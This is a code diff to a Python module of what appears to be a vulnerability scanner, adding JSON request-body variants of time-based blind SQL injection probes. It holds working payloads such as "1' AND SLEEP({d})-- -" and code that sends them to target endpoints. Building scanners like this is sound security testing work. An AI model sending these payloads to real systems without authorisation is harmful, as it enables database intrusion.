@@ -41,7 +41,7 @@ from ...kernel.technique import (
     Hypothesis,
     ProbeSpec,
 )
-from ..common import with_parameter
+from ..common import json_body_request, with_parameter
 
 NAME = "sqli_blind_time"
 
@@ -79,6 +79,19 @@ SLEEP_PAYLOAD = SLEEP_PAYLOADS[0]
 TIMING_BASELINE = "baseline"
 TIMING_INJECTED = "injected"
 
+#: The body-transport variants: the same interpolation shapes, sent where a
+#: JSON API's parameter actually lives — the request body. Declared *after*
+#: the query table so a query-shaped surface's grammar (ids, send order, the
+#: digest of every existing run) is byte-identical to what it always was; the
+#: body table is reachable only through a ``where="body"`` surface, so the
+#: two transports can never mix in one population.
+BODY_VARIANTS: tuple[tuple[str, str], ...] = (
+    ("json_numeric", "1 AND SLEEP({d})"),
+    ("json_quote_closed", "1' AND SLEEP({d}) AND 'a'='a"),
+    ("json_quote_paren", "1') AND SLEEP({d}) AND ('a'='a"),
+    ("json_comment", "1' AND SLEEP({d})-- -"),
+)
+
 
 def probe_id(hypothesis: Hypothesis) -> str:
     return f"{NAME}:{hypothesis.surface.host}:{hypothesis.surface.param}"
@@ -93,7 +106,24 @@ def variant_payload(variant: str) -> str:
 
 
 def _detail(hypothesis: Hypothesis, payload: str, timing_class: str) -> dict:
+    """One probe's request detail, shaped by where the parameter lives.
+
+    ``where="body"`` is the API-program shape: the payload travels as a JSON
+    body (``{param: payload}``) with the JSON content type, and the URL stays
+    the surface's own. Every other spelling keeps the classic query-parameter
+    shape. ``timing_class`` is observation metadata, not a transport kwarg —
+    the driver reads it out before the request is built.
+    """
     surface = hypothesis.surface
+    if surface.where == "body":
+        url, headers, content = json_body_request(surface, surface.param, payload)
+        return {
+            "url": url,
+            "method": "POST",
+            "headers": headers,
+            "content": content,
+            "timing_class": timing_class,
+        }
     return {
         "url": with_parameter(surface.url, surface.param, payload),
         "method": "GET",
@@ -131,7 +161,11 @@ def probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
                 purpose=PURPOSE_PROPOSE,
             )
         )
-        for variant, payload in zip((name for name, _ in PAYLOAD_VARIANTS), SLEEP_PAYLOADS):
+        variants = (
+            BODY_VARIANTS if surface.where == "body" else PAYLOAD_VARIANTS
+        )
+        for variant, template in variants:
+            payload = template.replace("{d}", str(SLEEP_SECONDS))
             specs.append(
                 ProbeSpec(
                     id=f"{probe}:{TIMING_INJECTED}:{variant}:{index}",
@@ -153,6 +187,7 @@ def probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
 
 
 __all__ = [
+    "BODY_VARIANTS",
     "NAME",
     "PAYLOAD_VARIANTS",
     "QUIET_PAYLOAD",
